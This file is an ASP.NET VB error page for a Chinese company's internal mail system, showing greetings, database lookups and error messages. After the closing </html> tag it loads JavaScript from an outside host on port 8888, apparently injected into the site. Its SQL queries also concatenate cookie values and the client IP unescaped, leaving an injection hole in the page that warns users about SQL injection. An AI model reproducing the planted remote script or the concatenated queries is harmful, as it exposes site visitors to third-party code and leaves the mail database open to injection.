<%@ Page Language="VB" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<%@ Register Assembly="System.Web.Extensions, Version=1.0.61025.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
    Namespace="System.Web.UI" TagPrefix="asp" %>
<script runat="server">
    Dim dbconn As New dbconn
    Dim conn As Data.OleDb.OleDbConnection
    Dim cmd As Data.OleDb.OleDbCommand
    Dim dr As Data.OleDb.OleDbDataReader
    Protected Sub Page_Init(ByVal sender As Object, ByVal e As System.EventArgs)
        If CInt(Request.QueryString("id")) <> weberr.dbconnerr Then
            dbconn.Create()
            conn = dbconn.GetConn()
            cmd = conn.CreateCommand
        End If
    End Sub
    Protected Sub Page_Unload(ByVal sender As Object, ByVal e As System.EventArgs)
        If (conn Is Nothing) = False Then
            dbconn.Close()
            conn = Nothing
            dbconn = Nothing
            cmd = Nothing
        End If
    End Sub
    Protected Sub Timer_timemsg_Tick(ByVal sender As Object, ByVal e As System.EventArgs)
        Dim tempmsg As String
        Select Case Now.Hour
            Case 0 To 4
                tempmsg = "凌晨好！"
            Case 5 To 7
                tempmsg = "早上好！"
            Case 8 To 11
                tempmsg = "上午好！"
            Case 12
                tempmsg = "中午好！"
            Case 13 To 17
                tempmsg = "下午好！"
            Case 18 To 23
                tempmsg = "晚上好！"
        End Select
        Label_timemsg.Text = "现在是" + CStr(Now.Date.Year) + "年" + Right("0" + CStr(Now.Month), 2) + "月" + Right("0" + CStr(Now.Day), 2) + "日" + " " + Right("0" + CStr(Now.Hour), 2) + "时" + Right("0" + CStr(Now.Minute), 2) + "分" + Right("0" + CStr(Now.Second), 2) + "秒 " + tempmsg
    End Sub
</script>
<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
<link rel="stylesheet" href="Style.css" type="text/css" />
<link rel="shortcut icon" href="logo.ico" type="image/x-icon" />
    <title>
    <%
        If CInt(Request.QueryString("id")) <> weberr.dbconnerr Then
            cmd.CommandText = "select * from webinfo"
            dr = cmd.ExecuteReader()
            dr.Read()
            Response.Write(dr("comname") + "内部邮件系统 出错了！")
            dr.Close ()
        Else
            Response.Write("内部邮件系统 出错了！")
        End If
    %>
    </title>
</head>
<body>

    <form id="form1" runat="server">
    <div>
    <asp:scriptmanager ID="Scriptmanager1" runat="server">
        </asp:scriptmanager>
        <asp:UpdatePanel ID="UpdatePanel1" runat="server" UpdateMode="Conditional">
        <ContentTemplate> 
        <asp:Timer ID="Timer_timemsg" runat="server" Interval ="1" OnTick="Timer_timemsg_Tick" /> 
        <asp:Label ID="Label_timemsg" runat="server" Text="Label" Width="744px" />
        </ContentTemplate>
        </asp:UpdatePanel>
        <% 
            If CInt(Request.QueryString("id")) <> weberr.dbconnerr Then
            cmd.CommandText = "select * from WebInfo"
            dr = cmd.ExecuteReader()
            If dr.HasRows() = True Then
                dr.Read()
                Response.Write("<br /><br /><center><img src=logo.jpg><font color=#FFFFFF size=12px>" + dr("comname") + "内部邮件系统欢迎您！</font></center><br /><br />")
            End If
            dr.Close()
            else
            Response.Write("内部邮件系统")
            end if
        %>
        <% 
            On Error Resume Next
            Dim id As weberr
            Dim errortext As String
            Dim ip As String
            Dim time As String
            Dim user As String
            Dim rndtext As String
            Dim FunctionClass As New FunctionClass
            Dim a As Integer
            id = Int(Request.QueryString("id"))
            ip = FunctionClass.GetIP()
            time = Now.ToString("G")
            user = Request.Cookies("nbmailsystem")("user")
            rndtext = Request.Cookies("nbmailsystem")("rndtext").ToString()
            If FunctionClass.IsTrue(user) = False Or user = "" Then
                user = ""
            Else
                If id <> weberr.dbconnerr Then
                    cmd.CommandText = "select * from UserInfo where username='" + user + "' and rndtext='" + rndtext + "'"
                    dr = cmd.ExecuteReader()
                    If dr.HasRows = False Then
                        user = ""
                    End If
                    dr.Close ()
                End If
            End If
            Select Case id
                Case weberr.dbconnerr
                    errortext = "数据库连接失败！"
                Case weberr.sqlerr
                    cmd.CommandText = "insert into LogInfo(IP,UserName,[Time],LogID) values('" + ip + "','" + user + "',#" + time + "#," + CStr(logrecord.sqle) + ")"
                    cmd.ExecuteNonQuery()
                    errortext = "您尝试进行SQL注入，系统已经记录您的信息：</br>IP：" + ip + IIf(user <> "", "</br>用户名：" + user, "") + "</br>时间：" + time
                Case weberr.parerr
                    errortext = "参数错误！"
                Case weberr.accessdberr
                    errortext = "访问数据库失败！"
                Case weberr.regfalse
                    errortext = "本公司内部邮件系统禁止外部注册，如要注册，请联系系统管理员！"
                Case Else
                    errortext = "错误ID错误！"
            End Select
            Response.Write(errortext + "</br><a href=" + Chr(34) + "javascript:History.Back()" + Chr(34) + ">返回上一页</a></br>" + "<a href=" + Chr(34) + "index.aspx" + Chr(34) + ">返回首页</a>")
        %>
    </div>
    </form>
</body>
</html>
<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>